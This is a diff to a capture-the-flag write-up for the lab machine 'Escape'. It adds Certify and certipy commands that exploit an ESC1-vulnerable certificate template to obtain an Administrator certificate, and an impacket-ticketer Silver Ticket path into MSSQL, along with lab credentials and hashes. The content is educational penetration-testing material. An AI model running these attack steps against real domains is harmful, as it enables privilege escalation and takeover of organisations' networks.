@@ -11,21 +11,34 @@
 
 > Escape is a Medium difficulty Windows Active Directory machine that starts with an SMB share that guest authenticated users can download a sensitive PDF file. Inside the PDF file temporary credentials are available for accessing an MSSQL service running on the machine. An attacker is able to force the MSSQL service to authenticate to his machine and capture the hash. It turns out that the service is running under a user account and the hash is crackable. Having a valid set of credentials an attacker is able to get command execution on the machine using WinRM. Enumerating the machine, a log file reveals the credentials for the user `ryan.cooper`. Further enumeration of the machine, reveals that a Certificate Authority is present and one certificate template is vulnerable to the ESC1 attack, meaning that users who are legible to use this template can request certificates for any other user on the domain including Domain Administrators. Thus, by exploiting the ESC1 vulnerability, an attacker is able to obtain a valid certificate for the Administrator account and then use it to get the hash of the administrator user.
 
+#### Skills Required
+
+- Enumeration
+- Windows Active Directory
+- Microsoft SQL server
+
+#### Skills Learned
+
+- Kerberos Authentication
+- [ESC1 attack](https://www.beyondtrust.com/blog/entry/esc1-attacks#domain-escalation--esc1)
+- NTLM Authentication
+
 #### Tools Used
 
-- certify.exe
+- Certify.exe
 - certipy-ad
 - crackmapexec
 - evil-winrm
 - impacket-mssqlclient
 - impacket-psexec
 - impacket-ticketer
-- kerbrute
 - john
+- kerbrute
 - ldapsearch
 - nmap
+- openssl
 - responder
-- rubeus.exe
+- Rubeus.exe
 - smbclient
 
 #### Machine Writeup
@@ -65,11 +78,11 @@ PORT      STATE SERVICE       VERSION
 445/tcp   open  microsoft-ds? ←
 464/tcp   open  kpasswd5?
 593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
-636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
+636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name) ←
 1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000 ←
-3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
-3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
-5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name) ←
+3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name) ←
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) ←
 9389/tcp  open  mc-nmf        .NET Message Framing
 49667/tcp open  msrpc         Microsoft Windows RPC
 49689/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
@@ -339,6 +352,13 @@ text: 000004DC: LdapErr: DSID-0C090A5C, comment: In order to perform this opera
 ❌
 
 `ldapsearch -x -H ldap://10.10.11.202/ -D 'sequel.htb\' -w '' -b "DC=sequel,DC=htb" '(objectClass=*)'`:
+```
+ldap_bind: Strong(er) authentication required (8) ←
+        additional info: 00002028: LdapErr: DSID-0C090259, comment: The server requires binds to turn on integrity checking if SSL\TLS are not already active on the connection, data 0, v4563
+```
+❌
+
+`ldapsearch -x -H ldap://10.10.11.202/ -D 'sequel.htb\guest' -w '' -b "DC=sequel,DC=htb" '(objectClass=*)'`:
 ```
 ldap_bind: Strong(er) authentication required (8) ←
         additional info: 00002028: LdapErr: DSID-0C090259, comment: The server requires binds to turn on integrity checking if SSL\TLS are not already active on the connection, data 0, v4563
@@ -1016,7 +1036,7 @@ Mode                LastWriteTime         Length Name
 
 `type C://Users/Ryan.Cooper/Desktop/user.txt`:
 ```
-be2e71f85885b9fc181d54ae2b8aeaca ←
+8d04a*************************** ←
 ```
 
 `whoami /all`:
@@ -1129,6 +1149,18 @@ Aliases for \\DC
 The command completed successfully.
 ```
 
+`net localgroup "Cert Publishers"`:
+```
+Alias name     Cert Publishers
+Comment        Members of this group are permitted to publish certificates to the directory
+
+Members
+
+-------------------------------------------------------------------------------
+DC$ ←
+The command completed successfully.
+```
+
 ![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)
 
 `cp ~/tools/SharpCollection/NetFramework_4.7_Any/Certify.exe ./certify.exe`
@@ -1144,7 +1176,9 @@ Info: Upload successful!
 
 ![Victim: ryan.cooper](https://custom-icon-badges.demolab.com/badge/Victim-ryan.cooper-64b5f6?logo=windows11&logoColor=white)
 
-`./certify.exe find /vulnerable`:
+Now, we can start enumerating possible Certificate Authorities.
+
+`./certify.exe cas`:
 ```
    _____          _   _  __
   / ____|        | | (_)/ _|
@@ -1156,12 +1190,34 @@ Info: Upload successful!
                             |___./
   v1.1.0
 
-[*] Action: Find certificate templates
+[*] Action: Find certificate authorities
 [*] Using the search base 'CN=Configuration,DC=sequel,DC=htb'
 
-[*] Listing info about the Enterprise CA 'sequel-DC-CA'
 
-    Enterprise CA Name            : sequel-DC-CA ←
+[*] Root CAs
+
+    Cert SubjectName              : CN=sequel-DC-CA, DC=sequel, DC=htb ←
+    Cert Thumbprint               : A263EA89CAFE503BB33513E359747FD262F91A56
+    Cert Serial                   : 1EF2FA9A7E6EADAD4F5382F4CE283101
+    Cert Start Date               : 11/18/2022 12:58:46 PM
+    Cert End Date                 : 11/18/2121 1:08:46 PM
+    Cert Chain                    : CN=sequel-DC-CA,DC=sequel,DC=htb
+
+
+
+[*] NTAuthCertificates - Certificates that enable authentication:
+
+    Cert SubjectName              : CN=sequel-DC-CA, DC=sequel, DC=htb
+    Cert Thumbprint               : A263EA89CAFE503BB33513E359747FD262F91A56
+    Cert Serial                   : 1EF2FA9A7E6EADAD4F5382F4CE283101
+    Cert Start Date               : 11/18/2022 12:58:46 PM
+    Cert End Date                 : 11/18/2121 1:08:46 PM
+    Cert Chain                    : CN=sequel-DC-CA,DC=sequel,DC=htb
+
+
+[*] Enterprise/Enrollment CAs:
+
+    Enterprise CA Name            : sequel-DC-CA
     DNS Hostname                  : dc.sequel.htb
     FullName                      : dc.sequel.htb\sequel-DC-CA
     Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
@@ -1183,6 +1239,67 @@ Info: Upload successful!
       Allow  ManageCA, ManageCertificates               sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
     Enrollment Agent Restrictions : None
 
+
+    Enabled Certificate Templates:
+        UserAuthentication
+        DirectoryEmailReplication
+        DomainControllerAuthentication
+        KerberosAuthentication
+        EFSRecovery
+        EFS
+        DomainController
+        WebServer
+        Machine
+        User
+        SubCA
+        Administrator
+
+
+
+Certify completed in 00:00:34.8113031
+```
+
+We were right, there is a CA on the remote machine. We can use `Certify` once again to enumerate vulnerable certificates.
+
+`./certify.exe find /vulnerable`:
+```
+   _____          _   _  __
+  / ____|        | | (_)/ _|
+ | |     ___ _ __| |_ _| |_ _   _
+ | |    / _ \ '__| __| |  _| | | |
+ | |___|  __/ |  | |_| | | | |_| |
+  \_____\___|_|   \__|_|_|  \__, |
+                             __/ |
+                            |___./
+  v1.1.0
+
+[*] Action: Find certificate templates
+[*] Using the search base 'CN=Configuration,DC=sequel,DC=htb'
+
+[*] Listing info about the Enterprise CA 'sequel-DC-CA'
+
+    Enterprise CA Name            : sequel-DC-CA ←
+    DNS Hostname                  : dc.sequel.htb
+    FullName                      : dc.sequel.htb\sequel-DC-CA ←
+    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
+    Cert SubjectName              : CN=sequel-DC-CA, DC=sequel, DC=htb
+    Cert Thumbprint               : A263EA89CAFE503BB33513E359747FD262F91A56
+    Cert Serial                   : 1EF2FA9A7E6EADAD4F5382F4CE283101
+    Cert Start Date               : 11/18/2022 12:58:46 PM
+    Cert End Date                 : 11/18/2121 1:08:46 PM
+    Cert Chain                    : CN=sequel-DC-CA,DC=sequel,DC=htb
+    UserSpecifiedSAN              : Disabled
+    CA Permissions                : ←
+      Owner: BUILTIN\Administrators        S-1-5-32-544
+
+      Access Rights                                     Principal
+
+      Allow  Enroll                                     NT AUTHORITY\Authenticated UsersS-1-5-11 ←
+      Allow  ManageCA, ManageCertificates               BUILTIN\Administrators        S-1-5-32-544
+      Allow  ManageCA, ManageCertificates               sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
+      Allow  ManageCA, ManageCertificates               sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
+    Enrollment Agent Restrictions : None
+
 [!] Vulnerable Certificates Templates :
 
     CA Name                               : dc.sequel.htb\sequel-DC-CA
@@ -1190,12 +1307,12 @@ Info: Upload successful!
     Schema Version                        : 2
     Validity Period                       : 10 years
     Renewal Period                        : 6 weeks
-    msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
+    msPKI-Certificate-Name-Flag           : ENROLLEE_SUPPLIES_SUBJECT ←
     mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS
-    Authorized Signatures Required        : 0
+    Authorized Signatures Required        : 0 ←
     pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Secure Email
     mspki-certificate-application-policy  : Client Authentication, Encrypting File System, Secure Email
-    Permissions ←
+    Permissions
       Enrollment Permissions
         Enrollment Rights           : sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                       sequel\Domain Users           S-1-5-21-4078382237-1492182817-2568127209-513
@@ -1217,6 +1334,9 @@ Info: Upload successful!
 Certify completed in 00:00:11.5008049
 ```
 
+We can indeed see that there actually is a vulnerable template called `UserAuthentication` . In particular we can see that `Authenticated Users` can enroll for this template and since the `msPKI-Certificate-Name-Flag` is present and contains `ENROLLEE_SUPPLIES_OBJECT` the template is vulnerable to the ESC1 scenario. Essentially, this allows anyone to enroll in this template and specify an arbitrary Subject Alternative Name. Meaning that, we could authenticate as a Domain Admin by exploiting this attack path.
+To exploit this, we can use either `Certify` or `certipy`.
+
 `./certify.exe request /ca:dc.sequel.htb\sequel-DC-CA /template:UserAuthentication /altname:Administrator`:
 ```
    _____          _   _  __
@@ -1235,7 +1355,7 @@ Certify completed in 00:00:11.5008049
 [*] No subject name specified, using current context as subject.
 
 [*] Template                : UserAuthentication ←
-[*] Subject                 : CN=Ryan.Cooper, CN=Users, DC=sequel, DC=htb
+[*] Subject                 : CN=Ryan.Cooper, CN=Users, DC=sequel, DC=htb ←
 [*] AltName                 : Administrator ←
 
 [*] Certificate Authority   : dc.sequel.htb\sequel-DC-CA ←
@@ -1243,7 +1363,7 @@ Certify completed in 00:00:11.5008049
 [*] CA Response             : The certificate had been issued.
 [*] Request ID              : 13
 
-[*] cert.pem         :
+[*] cert.pem         : ←
 
 -----BEGIN RSA PRIVATE KEY-----
 MIIEpQIBAAKCAQEAvMth4TPg4/SdSzZsV0PsL7iaXd28vAKO5BFLPC7n5LCv417C
@@ -1309,7 +1429,11 @@ VCqdWRpXDl1NlwptIRJw2le/LV1W4w==
 -----END CERTIFICATE-----
 
 
-[*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
+[*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx ←
+
+
+
+Certify completed in 00:00:05.1817801
 ```
 
 ![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)
@@ -1644,6 +1768,8 @@ Certificate Templates
       ESC1                              : 'SEQUEL.HTB\\Domain Users' can enroll, enrollee supplies subject and template allows client authentication ←
 ```
 
+
+
 `certipy-ad req -u 'Ryan.Cooper' -p 'NuclearMosquito3' -target 10.10.11.202 -upn Administrator@sequel.htb -ca sequel-DC-CA -template UserAuthentication`:
 ```
 Certipy v4.8.2 - by Oliver Lyak (ly4k)
@@ -1657,6 +1783,8 @@ Certipy v4.8.2 - by Oliver Lyak (ly4k)
 [*] Certificate has no object SID
 [*] Saved certificate and private key to 'administrator.pfx' ←
 ```
+
+Now that we have a certificate for the administrator we can use `certipy` once more to get a Ticket Granting Ticket (TGT) and extract the NT hash for this user. Since this step requires some Kerberos interaction, we need to synchronize our clock to the time of the remote machine before we can proceed.
 
 `file ./administrator.pfx`:
 ```
@@ -1756,14 +1884,20 @@ nt authority\system ←
                2 Dir(s)   5,845,590,016 bytes free
 ```
 
-`type ./root.txt`:
+`type root.txt`:
 ```
-18368d0dbfa0980a5f359271fb71c267
-
-44de8*************************** ←
+9f168*************************** ←
 ```
 
 <🔄 Alternative Step>
+
+The way that this machine is set up allows for another interesting solution. More specifically, this alternative approach requires us to have at least reached the point that we have the clear text password for the user `sql_svc `. This step is extremely important since this is a user account that runs the MSSQL service meaning that tickets to access this service will be encrypted with the password of the `sql_svc` user.
+
+Following the logic of a Silver Ticket attack we could be able to forge a ticket in behalf of the user
+`Administrator` to access the MSSQL service. Unfortunately, there is no Service Principal Name (SPN) set for this service instance so Kerberos isn't able to produce a valid Service Ticket for us that we could then try and alter.
+
+In this case, we can use `ticketer` from `impacket`. This script, has the benefit that the ticket creation is done locally, meaning that there is no need to contact Kerberos on the remote machine and ask for a Service Ticket. Moreover, we have to keep in mind that the service is responsible for validating presented tickets and **not** Kerberos. So, even if Kerberos is unaware that MSSQL is running under `sql_svc` if we manage to craft a valid ticket locally for the `Administrator` user we should be able to access the service as this user.
+First of all, we need to find out the domain SID. There are many way to get this since we have a valid pair of credentials for the user `sql_svc` but the easiest one is through WinRM.
 
 ![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)
 
@@ -1813,6 +1947,9 @@ UsersContainer                     : CN=Users,DC=sequel,DC=htb
 
 ![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)
 
+Now, we can craft a ticket for the MSSQL service.
+The `spn` parameter is needed to produce a valid ticket but we can place anything we want since it's not set to begin with.
+
 `impacket-ticketer -nthash '1443ec19da4dac4ffc953bca1b57b4cf' -domain-sid 'S-1-5-21-4078382237-1492182817-2568127209' -domain 'sequel.htb' -spn 'fakespn/dc.sequel.htb' 'Administrator'`:
 ```
 Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
@@ -1830,6 +1967,8 @@ Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
 [*]     EncTGSRepPart
 [*] Saving ticket in Administrator.ccache ←
 ```
+
+Now, we export our ticket and authenticate to the service using Kerberos authentication.
 
 `KRB5CCNAME=./Administrator.ccache impacket-mssqlclient -k -no-pass 'Administrator@dc.sequel.htb'`:
 ```
